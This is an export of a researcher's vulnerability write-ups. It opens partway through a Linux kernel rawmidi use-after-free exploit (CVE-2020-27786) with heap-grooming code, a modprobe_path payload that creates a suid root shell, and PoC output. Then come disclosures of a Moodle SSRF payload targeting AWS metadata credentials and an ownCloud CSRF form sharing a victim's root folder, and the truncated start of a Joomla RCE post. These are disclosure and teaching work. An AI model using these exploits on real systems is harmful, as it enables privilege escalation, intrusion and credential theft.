params-\u003ebuffer_size;\n@@ -962,8 +978,10 @@ static long snd_rawmidi_kernel_read1(struct snd_rawmidi_substream *substream,\n        long result = 0, count1;\n        struct snd_rawmidi_runtime *runtime = substream-\u003eruntime;\n        unsigned long appl_ptr;\n+       int err = 0;\n \n        spin_lock_irqsave(\u0026runtime-\u003elock, flags);\n+       snd_rawmidi_buffer_ref(runtime);\n        while (count \u003e 0 \u0026\u0026 runtime-\u003eavail) {\n                count1 = runtime-\u003ebuffer_size - runtime-\u003eappl_ptr;\n                if (count1 \u003e count)\n@@ -982,16 +1000,19 @@ static long snd_rawmidi_kernel_read1(struct snd_rawmidi_substream *substream,\n                if (userbuf) {\n                        spin_unlock_irqrestore(\u0026runtime-\u003elock, flags);\n                        if (copy_to_user(userbuf + result,\n-                                        runtime-\u003ebuffer + appl_ptr, count1)) {\n-                               return result \u003e 0 ? result : -EFAULT;\n-                       }\n+                                        runtime-\u003ebuffer + appl_ptr, count1))\n+                               err = -EFAULT;\n                        spin_lock_irqsave(\u0026runtime-\u003elock, flags);\n+                       if (err)\n+                               goto out;\n                }\n                result += count1;\n                count -= count1;\n        }\n+ out:\n+       snd_rawmidi_buffer_unref(runtime);\n        spin_unlock_irqrestore(\u0026runtime-\u003elock, flags);\n-       return result;\n+       return result \u003e 0 ? result : err;\n }\n \n long snd_rawmidi_kernel_read(struct snd_rawmidi_substream *substream,\n@@ -1262,6 +1283,7 @@ static long snd_rawmidi_kernel_write1(struct snd_rawmidi_substream *substream,\n                        return -EAGAIN;\n                }\n        }\n+       snd_rawmidi_buffer_ref(runtime);\n        while (count \u003e 0 \u0026\u0026 runtime-\u003eavail \u003e 0) {\n                count1 = runtime-\u003ebuffer_size - runtime-\u003eappl_ptr;\n                if (count1 \u003e count)\n@@ -1293,6 +1315,7 @@ static long snd_rawmidi_kernel_write1(struct snd_rawmidi_substream *substream,\n        }\n       __end:\n        count1 = runtime-\u003eavail \u003c runtime-\u003ebuffer_size;\n+       snd_rawmidi_buffer_unref(runtime);\n\n```\n\nTwo functions were added: [snd_rawmidi_buffer_ref](https://elixir.bootlin.com/linux/v4.9.224/source/sound/core/rawmidi.c#L112) and [snd_rawmidi_buffer_unref](https://elixir.bootlin.com/linux/v4.9.224/source/sound/core/rawmidi.c#L117). They are respectively used to take and remove a reference to the buffer using `snd_rawmidi_runtime-\u003ebuffer_ref` when it is copying ([snd_rawmidi_kernel_read1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L957)) or writing ([snd_rawmidi_kernel_write1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1242)) into that buffer. But why this was needed? Because read and write operations handled by [snd_rawmidi_kernel_write1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L1242) and [snd_rawmidi_kernel_read1](https://elixir.bootlin.com/linux/v4.9.223/source/sound/core/rawmidi.c#L957) temporarly unlock the runtime lock during the copying from/to userspace using `spin_unlock_irqrestore`[1]/`spin_lock_irqrestore`[2] giving a small race window where the object can be modified during the `copy_from_user` call:\n```C\nstatic long snd_rawmidi_kernel_write1(struct snd_rawmidi_substream *substream, const unsigned char __user *userbuf, const unsigned char *kernelbuf, long count) {\n\t// [..]\n\t\t\tspin_unlock_irqrestore(\u0026runtime-\u003elock, flags); // [1]\n\t\t\tif (copy_from_user(runtime-\u003ebuffer + appl_ptr,\n\t\t\t\t\t   userbuf + result, count1)) {\n\t\t\t\tspin_lock_irqsave(\u0026runtime-\u003elock, flags);\n\t\t\t\tresult = result \u003e 0 ? result : -EFAULT;\n\t\t\t\tgoto __end;\n\t\t\t}\n\t\t\tspin_lock_irqsave(\u0026runtime-\u003elock, flags); // [2]\n\t// [..]\n\n}\n```\n\nIf a concurrent thread re-allocate the `runtime-\u003ebuffer` using the `SNDRV_RAWMIDI_IOCTL_PARAMS` ioctl, that thread can lock the object from `spin_lock_irq` [1] (that has been left unlocked in the small race window given by `snd_rawmidi_kernel_write1`) and free that buffer[2], making possible to re-allocate an arbitrary object and write on that. Also, the `kmalloc`[3] in `snd_rawmidi_output_params` is called with `params-\u003ebuffer_size` that is totally user controllable.\n\n```C\nint `snd_rawmidi_output_params`(struct snd_rawmidi_substream *substream,\n\t\t\t      struct snd_rawmidi_params * params)\n{\n\t// [..]\n\tif (params-\u003ebuffer_size != runtime-\u003ebuffer_size) {\n\t\tnewbuf = kmalloc(params-\u003ebuffer_size, GFP_KERNEL); // [3]\n\t\tif (!newbuf)\n\t\t\treturn -ENOMEM;\n\t\tspin_lock_irq(\u0026runtime-\u003elock); // [1]\n\t\toldbuf = runtime-\u003ebuffer;\n\t\truntime-\u003ebuffer = newbuf;\n\t\truntime-\u003ebuffer_size = params-\u003ebuffer_size;\n\t\truntime-\u003eavail = runtime-\u003ebuffer_size;\n\t\truntime-\u003eappl_ptr = runtime-\u003ehw_ptr = 0;\n\t\tspin_unlock_irq(\u0026runtime-\u003elock);\n\t\tkfree(oldbuf); // [3]\n\t}\n\t// [..]\n}\n```\n\nWhat happen if, while a thread is writing into the buffer with `copy_from_user`, another thread frees that buffer using the `SNDRV_RAWMIDI_IOCTL_PARAMS` ioctl and reallocates a new arbitrary one? The object is replaced with an new one and the `copy_from_user` will continue writing into another object (the \"victim object\") corrupting its values =\u003e User-After-Free (Write).\n\nThe really good part about this vulnerability is the \"freedom\" you can have:\n- It's possible to call `kmalloc` with an arbitrary size (and this will be the freed object that we are going to replace to cause a UAF) which means that we can target our favourite slab cache (based on what we need, ofc)\n- We can write as much as we want in the buffer with the `write` syscall\n\n## Extend the Race Time Window\nWe know we have a small race window with few instructions while copying data from userland to kernel as explained before, but the great news is that we have a `copy_from_user` that can be suspended arbitrarly handling page fault in user-space ! Since I was exploiting the vulnerability in a 4.9 kernel (4.9.223) and hence userfaultd is still not unprivileged as in \u003e5.11, we can still use it to extend our race window and have the necessary time to re-allocate a buffer!\n\n## Exploitation Plan\nWe stated that we are going to use the userfaultd technique to extend the time window. If you are new to this technique is well explained [here](https://lwn.net/Articles/819834/), in this [video](https://www.youtube.com/watch?v=6dFmH_JEF4s) (you can use substitles) and [here](https://blog.lizzie.io/using-userfaultfd.html). To summarize: you can handle page faults from user-land, temporarly blocking kernel execution while handling the page fault. If we `mmap` a block of memory with `MAP_ANONYMOUS` flag, the memory will be demand-zero paged, meaning that it's not yet allocated and we can allocate it via userfaultd.\nThe idea using this technique is:\n- Initialize the `runtime-\u003ebuffer` with `open` =\u003e This will allocate the buffer with 4096 size (that will land in `kmalloc-4096`)\n- Send `SNDRV_RAWMIDI_IOCTL_PARAMS` ioctl command in order to re-allocate the buffer with our desired size (e.g. 30 wil land in `kmalloc-32`)\n- Allocate with `mmap` a demand-zero paged (`MAP_ANON`) and initialize `userfaultd` to handle its page fault\n- `write` to the rawmidi file descriptor using our previously allocated mmaped memory =\u003e This will trigger the userland page fault in `copy_from_user`\n- While the kernel thread is suspended waiting for the userland page fault we can send again the `SNDRV_RAWMIDI_IOCTL_PARAMS` in order to free the current `runtime-\u003ebuffer`\n- We allocate an object in, for example, `kmalloc-32` and if we did some spray before on that cache it will take the place of the previous freed `runtime-\u003ebuffer`\n- We release the page fault from userland and the `copy_from_user` will continue writing its data (totally in user control) to the new allocated object\n\nWith this primitive, we can forges arbitrary objects with **arbitrary size** (specified in the `write` syscall), **arbitrary content**, **arbitrary offset** (since we can trigger userfaultd between two pages as demostrated later on) and **arbitrary cache** (we can control the size allocation in the `SNDRV_RAWMIDI_IOCTL_PARAMS` ioctl).\nAs you can deduce, we have a really great and powerful primitive !\n\n## Information Leak\n### Victim Object\nWe are going to use what we previously explained in the \"Exploitation Plan\" section to leak an address that we will re-use to have an arbitrary write. Since we can choose which cache trigger the UAF on (and that's gold from an exploitation point of view) I choose to leak the `shm_file_data-\u003ens` pointer that points to `init_ipc_ns` in the kernel `.data` section and it lives in `kmalloc-32` (I also used the same function to spray the `kmalloc-32` cache):\n\n```C\nvoid alloc_shm(int i)\n{\n\tint shmid[0x100]     = {0};\n\tvoid *shmaddr[0x100] = {0};\n    shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);\n    if (shmid[i]  \u003c 0) errExit(\"shmget\");\n    shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);\n    if (shmaddr[i] \u003c 0) errExit(\"shmat\");\n}\nalloc_shm(1)\n```\n\nFrom that pointer, we will deduce the pointer of `modprobe_path` in order to use that technique later to elevate our privileges.\n\n### msg_msg\n```C\nstruct msg_msg {\n\tstruct list_head m_list;\n\tlong m_type;\n\tsize_t m_ts;\t\t/* message text size */\n\tstruct msg_msgseg *next;\n\tvoid *security;\n\t/* the actual message follows immediately */\n};\n\nstruct msg_msgseg {\n\tstruct msg_msgseg *next;\n\t/* the next part of the message follows immediately */\n};\n\n```\nIn order to leak that address, however, we have to compromise some other object in `kmalloc-32`, maybe a length field that would read after its own object. For that case, `msg_msg` is our perfect match because it has a length field specified in its `msg_msg-\u003em_ts` and it can be allocated in almost any cache starting from `kmalloc-32` to `kmalloc-4096`, with just one downside: The minimun allocation for the `msg_msg` struct is 48 (`sizeof(struct msg_msg)`) and it can lands minimun at `kmalloc-64`.\nIf you want to read more about this structure you can checkout [Fire of Salvation Writeup](https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html), [Wall Of Perdition](https://syst3mfailure.io/wall-of-perdition) and the [kernel source code](https://elixir.bootlin.com/linux/v4.9.223/source/ipc/msg.c).\nHowever, when a message is sent using `msgsnd` with size more than [DATALEN_MSG](https://elixir.bootlin.com/linux/v4.9.223/source/ipc/msgutil.c#L46) (`((size_t)PAGE_SIZE-sizeof(struct msg_msg))`) that is 4096-48, a segment (or multiple segments if needed) is allocated, and the message is splitted between the `msg_msg` (the payload is just after the struct headers) and the `msg_msgseg`, with the total size of the message specified in `msg_msg-\u003em_ts`. \n\nIn order to allocate our target object in `kmalloc-32` we have to send a message with size: ( ( 4096 - 48 ) + 10 ).\n- The `msg_msg` structure will be allocated in `kmalloc-4096` and the first (4096 - 48) bytes will be written in the `msg_msg` structure.\n- To allocate the remaining 10 bytes, a segment `msg_msgseg` will be allocated in `kmalloc-32`\n\nWith these conditions, we can forge the `msg_msg` structure in `kmalloc-4096` overwriting its `m_ts` value with our UAF and with `msgrcv` we can receive a message that will contains values past our segment allocated in `kmalloc-32` (including our targeted `init_ipc_ns` pointer).\n\n#### Dealing with offsets\nHowever, we want to overwrite the `m_ts` value without overwriting anything else in the `msg_msg` structure, how we can do that?\nIf you remember, I said we can overwrite chunks with arbitrary size, content and **offset**. If we create a `mmap` memory with size `PAGE_SIZE * 2` (two pages) and we handle the page fault only for the second page, we can start writing into the original `runtime-\u003ebuffer` and trigger the page fault when it receives the `msg_msg-\u003em_ts` offset (0x18). Now that the kernel thread is blocked, it's possible to replace the object with `msg_msg` and when the `copy_from_user` resumes, it will starts writing exactly at the `msg_msg-\u003em_ts` value the remaining bytes. The size we are writing into the file descriptor is (0x18 + 0x2) since the first 0x18 bytes will be used to land at the exact offset and the 2 remaining bytes will write `0xffff` in `msg_msg-\u003em_ts`. The concept is also explained in the following picture:\n\n![[notes/images/2.png]]\n\nNow from the received message from `msgrcv` we can retrieve the `init_ipc_ns` pointer from `shm_file_data` and we can deduce the `modprobe_path` address calculating its offset and proceed with the arbitrary write phase.\n\n## Arbitrary Write\nIn order to write at arbitrary locations we are using the same userfault technique described above but instead of targeting `msg_msg` we will use the Vectored I/O (`pipe` + `iovec`) primitive. This primitive has been fixed in kernel 4.13 with [copyin](https://elixir.bootlin.com/linux/v4.13.1/source/lib/iov_iter.c#L142) and [copyout](https://elixir.bootlin.com/linux/v4.13.1/source/lib/iov_iter.c#L133) wrappers, with an `access_ok` addition. This technique has been widely used exploiting the Android Binder CVE-2019-2215 and is well detailed [here](https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html) and [here](https://cloudfuzz.github.io/android-kernel-exploitation/chapters/exploitation.html#leaking-task-struct-pointer).\n\nThe idea is to trigger the UAF once again but targeting the [iovec](https://elixir.bootlin.com/linux/v4.9.223/source/include/uapi/linux/uio.h#L16) struct:\n\n```C\nstruct iovec\n{\n\tvoid __user *iov_base;\t/* BSD uses caddr_t (1003.1g requires void *) */\n\t__kernel_size_t iov_len; /* Must be size_t (1003.1g) */\n};\n```\n\nThe [minimun allocation](https://elixir.bootlin.com/linux/v4.9.223/source/fs/read_write.c#L792) for `iovec` occurs with `sizeof(struct iovec) * 9` or `16 * 9` (144) that will land at `kmalloc-192` (otherwise it is stored in the stack). However I choose to allocate 13 vectors using `readv` to make the object land in `kmalloc-256`.\n```C\n    int pipefd[2];\n    pipe(pipefd)\n    // [...]\n    struct iovec iov_read_buffers[13] = {0};\n    char read_buffer0[0x100];\n    memset(read_buffer0, 0x52, 0x100);\n    iov_read_buffers[0].iov_base = read_buffer0;\n    iov_read_buffers[0].iov_len= 0x10;\n    iov_read_buffers[1].iov_base = read_buffer0;\n    iov_read_buffers[1].iov_len= 0x10;\n    iov_read_buffers[8].iov_base = read_buffer0;\n    iov_read_buffers[8].iov_len= 0x10;\n    iov_read_buffers[12].iov_base = read_buffer0;\n    iov_read_buffers[12].iov_len= 0x10;\n\n    if(!fork()){\n        ssize_t readv_res = readv(pipefd[0], iov_read_buffers, 13); // 13 * 16 = 208 =\u003e kmalloc-256\n        exit(0);\n    }\n```\n\nThe `readv` is a blocking call that **stays** (does not free) the object in the kernel so that we can corrupt it using our UAF and re-use it later with our arbitrary modified content. If we corrupt the `iov_base` of an `iovec` structure we can write at arbitrary kernel addresses with a `write` syscall since it is uses the unsafe [\\_\\_copy_from_user](https://elixir.bootlin.com/linux/v4.9.223/source/lib/iov_iter.c#L267) (same as `copy_from_user` but without checks).\n\n![[notes/images/3.png]]\n\nOur idea is:\n- Resize the `runtime-\u003ebuffer` with `SNDRV_RAWMIDI_IOCTL_PARAMS` in order to lands into`kmalloc-256` with a size greater than 192\n- `write` into the file descriptor specifycing a demanded-zero paged memory (`MAP_ANON`) so that `copy_from_user` will stop its execution waiting for our user-land page fault handler\n- While the kernel thread is waiting, free the buffer using again the re-size ioctl command `SNDRV_RAWMIDI_IOCTL_PARAMS`\n- Allocate the `iovec` struct using `readv` that will replace the previously allocated `runtime-\u003ebuffer`\n- Resume the kernel execution releasing the page fault handler. Now the `copy_from_user` will start to write into the `iovec` structure and we will overwrite `iov[1].iov_base` with the `modprobe_path` address.\n\nNow, in order to overwrite the `modprobe_path` value we just have to write our arbitrary content using the `write` syscall into `pipe[0]`. In the released exploit I overwrote the second iov entry (`iov[1]`) using the same technique described before with adjacent pages. However, it's also possible to directly overwrite the first `iov[0].iov_base`.\n\nNice ! Now we have overwritten `modprobe_path` with `/tmp/x` and .. it's time to pop a shell !\n\n### modprobe_path \u0026 uid=0\nIf you are not familiar with `modprobe_path` I suggest you to check out [Exploiting timerfd_ctx Objects In The Linux Kernel](https://syst3mfailure.io/hotrod) and the [man page](https://man7.org/linux/man-pages/man2/userfaultfd.2.html).\nTo summarize, `modprobe_path` is a global variable with a default value of `/sbin/modprobe` used by `call_usermodehelper_exec` to execute a user-space program in case a program with an unkown header is executed.\nSince we have overwritten `modprobe_path` with `/tmp/x`, when a file with an unknown header is executed, our controllable script is executed as root.\n\nThese are the exploit functions that prepares and later executes a suid shell:\n\n```C\nvoid prep_exploit(){\n    system(\"echo '#!/bin/sh' \u003e /tmp/x\");\n    system(\"echo 'touch /tmp/pwneed' \u003e\u003e /tmp/x\");\n    system(\"echo 'chown root: /tmp/suid' \u003e\u003e /tmp/x\");\n    system(\"echo 'chmod 777 /tmp/suid' \u003e\u003e /tmp/x\");\n    system(\"echo 'chmod u+s /tmp/suid' \u003e\u003e /tmp/x\");\n    system(\"echo -e '\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd' \u003e /tmp/nnn\");\n    system(\"chmod +x /tmp/x\");\n    system(\"chmod +x /tmp/nnn\");\n}\n\nvoid get_root_shell(){\n    system(\"/tmp/nnn 2\u003e/dev/null\");\n    system(\"/tmp/suid 2\u003e/dev/null\");\n}\n\nint main(){\n\tprep_exploit();\n\t// [..] exploit stuff\n\tget_root_shell(); // pop a root shell\n}\n\n```\n\nWhat the exploit does is simply create the `/tmp/x` binary that will suid as root a file dropped in `/tmp/suid` and create a file with an unknown header (`/tmp/nnn`) that will trigger the executon as root of `/tmp/x` from `call_usermodehelper_exec`. After that, the `/tmp/suid` gives root privileges and spawns a root shell.\n\nPOC:\n```bash\n/ $ uname -a                                   \nLinux (none) 4.9.223 #3 SMP Wed Jun 1 23:15:02 CEST 2022 x86_64 GNU/Linux \n/ $ id\nuid=1000(user) gid=1000 groups=1000\n/ $ /main \n[*] Starting exploitation ..\n[+] userfaultfd registered\n[*] First write to init substream..\n[*] Resizing buffer_size to 4096 ..\n[*] snd_write triggered (should fault) \n[*] Freeing buf using SNDRV_RAWMIDI_IOCTL_PARAMS\n[+] Page Fault triggered for 0x5551000!\n[*] Replacing freed obj with msg_msg .\n[*] Waiting for userfaultd to finish ..\n[*] Page fault thread terminated\n[+] Page fault lock released\n[+] init_ipc_ns @0xffffffff81e8d560\n[+] calculated modprobe_path @0xffffffff81e42a00\n[+] Starting the arbitrary write phase ..\n[*] Closing and reopening re-opening rawmidi fd ..\n[+] userfaultfd registered\n[*] First write to init substream..\n[*] Resizing buffer_size to land into kmalloc-256 ..\n[*] snd_write triggered (should fault) \n[*] Freeing buf from SNDRV_RAWMIDI_IOCTL_PARAMS\n[+] Page Fault triggered for 0x7771000!\n[*] Waiting for readv ..\n[*] Page fault thread terminated\n[+] Page fault lock released\n[*] Writing into the pipe ..\n[*] write = 24\n[+] enjoy your r00t shell [:\n/ # id\nuid=0(root) gid=0 groups=1000\n/ #\n```\n\n## Conclusion\nThat was my journey into exploiting a known vulnerability in the `4.9.223` kernel. You can find the whole exploit on github: https://github.com/kiks7/CVE-2020-27786-Kernel-Exploit.\n\n## References\n- https://1day.dev/2022-06/1day-devel-part-1.html\n- https://elixir.bootlin.com/linux/v4.9.223/source/\n- https://lwn.net/Articles/819834/\n- https://www.youtube.com/watch?v=6dFmH_JEF4s\n- https://blog.lizzie.io/using-userfaultfd.html\n- https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html\n- https://syst3mfailure.io/wall-of-perdition\n- https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html\n- https://cloudfuzz.github.io/android-kernel-exploitation/chapters/exploitation.html#leaking-task-struct-pointer\n- https://syst3mfailure.io/hotrod\n- https://man7.org/linux/man-pages/man2/userfaultfd.2.html\n- https://github.com/kiks7/CVE-2020-27786-Kernel-Exploit","lastmodified":"2025-04-14T13:32:05.60308601Z","tags":null},"/notes/Moodle-Server-Side-Request-Forgery-SSRF":{"title":"Moodle Server-Side Request Forgery","content":"\nDuring the research time in Hacktive Security I found 2 Server-Side Request Forgery on Moodle. The first one is a Blind SSRF already discovered in 2018 and tracked as CVE-2018-1042 without a proper patch, the other one is a fresh SSRF while parsing image tags inside the same component (**File Picker**). \n\n**They are currently not patched and both working on the latest Moodle version** because the Moodle Team, as they said from emails, leaves the responsibility to protect network interactions to system administrators. I personally do not agree with this statement because it leaves a dangerous vulnerability in a vanilla installation that can lead critical scenarios especially on cloud based hosting. So, in order to protect your Moodle installation, check out the Workaround section at the end of the article.\n\nLet's deppen these vulnerabilities starting from the impacted component, the File Picker.\n\n## File Picker\n\nThe File picker is a core Moodle component used to handle file uploads for multiple scopes. For example, it is used in the user's profile picture handling or in 'Private Files', a dedicated area for any authenticated user. You can easily upload a file, but also retrieve an image from an **arbitrary URL(!)**.\n\nAs it is used for multiple purposes, it is by default accessible to any authenticated user (also low privilege ones).\n\n## The fresh SSRF\n\nThe vulnerability resides on image parsing from an arbitrary URL (when an user choose to retrieve an image using the URL, as mentioned before).\nIf you request an HTML page, Moodle will fetch all `\u003cimg\u003e` tags inside it and ask you to choose which image you want to download. It extracts the src attribute for all image tags in the page and directly downloads the image, without further checks. That means that if we request the image from a server we control, we can request an HTML page with an arbitrary URL inside an image tag and Moodle will perform this arbitrary request for us. Then we can save the fake image (that contains the response for the SSRF) and display its result.\n\n### POC\n\n![img1|400](/notes/images/moodle/1.png)\n\nFrom the 'URL Downloader' action inside the File Picker, we can put a URL to our server that points to /index.html, that will contains the following payload:\n\n``\n\u003cimg src=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance\u003e\n``\n\nThe request will catch our `src` attribute as follow:\n\n\n![img2](/notes/images/moodle/2.png)\n\nThat will result, in the UI, in the following selection:\n\n![img3|400](/notes/images/moodle/3.png)\n\nWe can click on the box, and choose to download the fetced 'image'\n\n![img4|300](/notes/images/moodle/4.png)\n\nIn order to download the response, we have to provide a custom extension in the title name and customize the accepted_types[] parameter according to it (for example .arbitraryExtension)\n\n![img5](/notes/images/moodle/5.png)\n\nhe returned JSON response will contain the path to the result file (with the arbitrary request's response), that we can download with a GET request:\n\n![img6](/notes/images/moodle/6.png)\n\nBy automating this whole process with an exploit, we can now easily interact with local services.\n\nFor example, in a AWS EC2 instance we can interact with the Meta and User Data API internal endpoint at 169.254.169.254 (You can find more about this API at [AWS Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html).\n\n\n![img7](/notes/images/moodle/7.png)\n\n![img8](/notes/images/moodle/8.png)\n\n## The old Blind SSRF\nThe unpatched Blind SSRF vulnerability (CVE-2018-1042) was already described here: [exploit-db/exploits/47177](https://www.exploit-db.com/exploits/47177). The patch did not applied any fix, so it is still exploitable and more suitable for internal port scans (as it is blind):\n\n![img9|600](/notes/images/moodle/9.png)\n\nYou can find both exploits in the Reference section.\n\n## Conclusions and Workaround\nAs we said, these SSRF are actually working on the latest Moodle release and their impact can be pretty critical for cloud based instances. Moodle has an open issue that plans to restrict most common restriction scenarios [MDL-56873](https://tracker.moodle.org/browse/MDL-56873) from 2016.\n\nTo fix these issues, from 'Site Administration \u003e Security \u003e HTTP Security' it is possible to restrict allowed hosts and ports (cURL blocked hosts and cURL allowed ports). You can customize these configurations based on your environment (such as restricting the loopback, internal network and allowing only HTTP ports to avoid port scans also to external sources).\n\n## Timeline\n\n- 02/02/2020 - Moodle contacted\n- 03/02/2020 - They received the request and handle the case\n- 06/02/2020 - Blind SSRF vulnerability rejected (System Administrators should fix it)\n- 11/03/2020 - We replied to some questions\n- 25/03/2020 - Also the SSRF vulnerability is rejected (System Administrators should fix it)\n- 25/03/2020 - Tried to emphasize the risk\n- 30/03/2020 - Issues closed without a fix","lastmodified":"2025-04-14T13:32:05.60308601Z","tags":null},"/notes/Owncloud-Multiple-Vulnerabilities-CSRF-SSRF-and-Information-Leak":{"title":"Owncloud Multiple Vulnerabilities (CSRF, SSRF and Information Leak)","content":"\n## Introduction\nDuring the research time in Hacktive Security I discovered several flaws in the [owncloud](https://owncloud.org/) product.\n\u003cbr\u003eOwncloud is an open-source cloud service similar to Google Drive. It is a good and popular piece of software and it was strange that the last CVE was from the far 2017 (2 years ago).So, we started looking at it and we disclosed 3 vulnerabilities related to the file sharing context, for sure a good attack vector.\n\nWhat I discovered could **compromise user's root folder** (read/write) via *CSRF*, cause an **authenticated Denial of Service** or **interact with local services** (*SSRF*) and **bypass password protected images**.\n\nWe reported all these issues in 17/10/2019, the ownCloud team fixed two of them after few months (SSRF and the bypass of protected images), but still do not have a patch for the reported CSRF. We tried to ping them multiple times and after 277 days since the first contact we decided to make them public (Disclosure Timeline at the end of the post).\n\n\n\n## Compromise user’s root folder via CSRF\n\nBy exploiting a Cross-Site Request Forgery, it is possible to trick a user to share its whole **root folder** with another user or with a public link without authentication.\n\nThis is the vulnerable Request:\n\n```c\nPOST /ocs/v2.php/apps/files_sharing/api/v1/shares?format=json HTTP/1.1\nHost: mycloud.com:8081\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nCookie: ocqbn9pixyab=XXXX; oc_sessionPassphrase=XXXX\nContent-Length: 52\n\nshareType=0\u0026shareWith=attacker\u0026permissions=31\u0026path=./\n\n```\n\n*Note: **owncloud doesn't let users share their own root folder**, you cannot do it via GUI and if you make a forged request with '/' to indicate the root folder, an error message appears:*\n\n![img1](/notes/images/owncloud/1.png)\n\n*This was not a big deal because It was easily bypassable just by using './' as a payload inside the 'path' parameter:*\n\n![img2](/notes/images/owncloud/2.png)\n\n\nThe '**shareType**' indicates the type of sharing. In this case 0 means a share with another user specified in the **'shareWith'** parameter. A shareType 3 means a public share through a public link with 15 random characters. The entropy is too high to bruteforce and it is well implemented (this share type could be fine chaining an XSS). Last, but not least, **'permissions'** set to 31 means read and write permissions on the share.\n\nSimulating an offensive scenario, this could be the attacker's page:\n\n```html\n\u003cform name=\"csrf\" enctype=\"application/x-www-form-urlencoded\" method=POST action=https://TARGET/ocs/v2.php/apps/files_sharing/api/v1/shares?format=json\u003e\n    \u003cinput type=hidden name=shareType value=\"0\"\u003e\n    \u003cinput type=hidden name=shareWith value=\"ATTACKER\"\u003e\n    \u003cinput type=hidden name=permissions value=\"31\"\u003e\n    \u003cinput type=hidden name=path value=\"./\"\u003e    \n\u003c/form\u003e\n\n\u003cscript\u003e\ndocument.csrf.submit();\n\u003c/script\u003e\n\n```\n\nVictim visits the page:\n\n![img3](/notes/images/owncloud/3.png)\n\nAnd the root folder is shared with the attacker:\n\n![img4](/notes/images/owncloud/4.png)\n\n\nIt would be cool to chain this vulnerability with a Cross-Site Scripting. Making a request from the same site doesn't trigger CORS, and the response is readable (in the response there is the public link). In this case, it could be just necessary to inject a script that makes a request to the vulnerable endpoint, read the response that contains the public link share, and send this one to the attacker. In this way, the whole root folder could be easily accessible from the internet and without authentication. But, sadly, this is not the case (and owncloud also employs a strict CSP). We only had a CSRF, so we could only perform blind POST requests.\n\nThis wannabe scenario is still possible with older browsers that do not support CORS validation or configured web server with too permissive policies. \n\n\n\n## Server Side Request Forgery + DOS\n\nA convenient functionality is to fetch files from a public link to your own (own-)cloud. When you receive a public link and you want to save the file in your cloud, you can use the arrow at the top right and it will do the hard work for you:\n\n![img5](/notes/images/owncloud/5.png)\n\nIn order to fetch the file, it has to know where you want to get the file, and it is specified in the following request :\n\n![img6](/notes/images/owncloud/6.png)\n\nFrom this parameter you can perform Server Side Requests to arbitrary local services, including the loopback:\n\n![img7](/notes/images/owncloud/7.png)\n\nIf we try this request we receive a callback from localhost:\n\n![img8](/notes/images/owncloud/8.png)\n\nThe docker provided from their official repository ships with Redis configured, that could be an interesting component to attack with our SSRF. In the first request we do not have many controllable parameters, just the URI (without CLRF). So we started to go deeper, because it has to make other requests in order to fetch a file from another cloud.\n\nWe started to analyze the flow between two valid clouds (thanks burp for the reverse proxy job) and we were right, we got multiple requests:\n\n![img9](/notes/images/owncloud/9.png)\n\n*(screen from ngrok - cleaner than burp requests)*\n\nMaybe we could be lucky and find something more useful in later requests (some parameters are reflected from response of the receiver cloud).. But nope. That was a fail. After 2 days of fuzzing/implementation of a valid clone of an owncloud receiver in python (and ngrok in order to avoid caching of a target domain), we stopped because it was not the right path, and we were losing too much time for a potential Authenticated RCE valid only for some environments. And, unfortunately, we couldn't achieve RCE.\n\nBy the way, SSRF can be used to scan the internal network for open services and/or interact with them, but if it doesn't reach a couple of addresses .. you have a nice little Denial Of Service (tested on a production server).\n\nBurp DOS configuration:\n\n![img10](/notes/images/owncloud/10.png)\n![img11](/notes/images/owncloud/11.png)\n![img12](/notes/images/owncloud/12.png)\n\nAnd few seconds later…\n\n![img13](/notes/images/owncloud/13.png)\n\n## Bypass password protected images\n\nWhen you want to share to non authenticated users something in the cloud, you can use the 'Share with Public Link' option and protect it with a password in order to avoid other people watching it, if they eventually reach the link.\n\nWhen sharing Images, the generated token (the 15 characters long narrowed before) can be used in the preview functionality without authentication, bypassing the required password.\n\nThe protected shared image:\n\n![img14](/notes/images/owncloud/14.png)\n\nImage leaked:\n\n![img15](/notes/images/owncloud/15.png)\n\n## Timeline\n- 17/10/2019 - Issues reported\n- 15/11/2019 - Request an update since we didn’t receive any reply\n- 13/12/2019 - 2 of 3 vulnerabilities fixed\n- 09/02/2020 - We requested an update for the third vulnerability\n- 09/02/2020 - They’re working to patch it\n- 13/07/2010 - No patch, we informed them that we are going to make them public\n- 27/07/2020 - No reply, issues published","lastmodified":"2025-04-14T13:32:05.604086015Z","tags":null},"/notes/Rusty-Joomla-Remote-Code-Execution":{"title":"Rusty Joomla Remote Code Execution","content":"\n## Introduction\n\nDuring one of research activities in [Hacktive Security](http://hacktivesecurity.com/), we discovered an **undisclosed PHP Object Injection** on Joomla CMS from the 3.0.0 release to the 3.4.6 (releases from 2012 to December 2015) that leads to Remote Code Execution.\nA PHP Object Injection was discovered in the wild and patched in the 3.4.5 version (CVE-2015-8562), however, this vulnerability depends also a lot on the PHP release installed becoming not really trusty for all environments.\n\nComparing this RCE with CVE-2015-8562:\n- \\+ It is completely independent from the environment, becoming more reliable;\n- \\+ Vulnerable from the 3.0.0 to 3.4.6 (just one more minor release, not so much);\n- \\- Few releases vulnerable compared to CVE-2015-8562.\n\nHowever, the fun part of this vulnerability was the exploitation. There aren’t a lot of blog posts about some more advanced and manual exploitation of PHP Object Injection (except for some good resources from RIPS) so this paper can be useful while exploiting it in other contexts.\n\n\n## How Sessions works\nJoomla sessions are stored in the database as PHP Objects and they are handled by PHP session functions. It is an interesting attack vector because sessions are also stored for unauthenticated users so an Object Injection there can lead to unauthenticated RCE.\n\nFunctions `read()` and `write()` defined in `libraries/joomla/session/storage/database.php` are set by the `session_set_save_handler()` in order to be used as read and write handlers for the `session_start()` call at `libraries/joomla/session/session.php:__start`\n\nThis is an example of a classic Joomla (before 